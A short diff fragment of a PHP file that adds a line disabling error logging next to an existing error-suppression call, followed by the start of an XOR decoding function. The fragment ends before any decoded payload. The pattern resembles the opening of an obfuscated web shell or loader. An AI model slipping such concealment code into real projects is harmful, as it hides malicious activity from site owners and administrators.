@@ -1,4 +1,5 @@
 <?php
+@ini_set('error_log', NULL);
 @error_reporting(0);
 function xor_decipher($data, $key) {
     $keyLen = strlen($key);
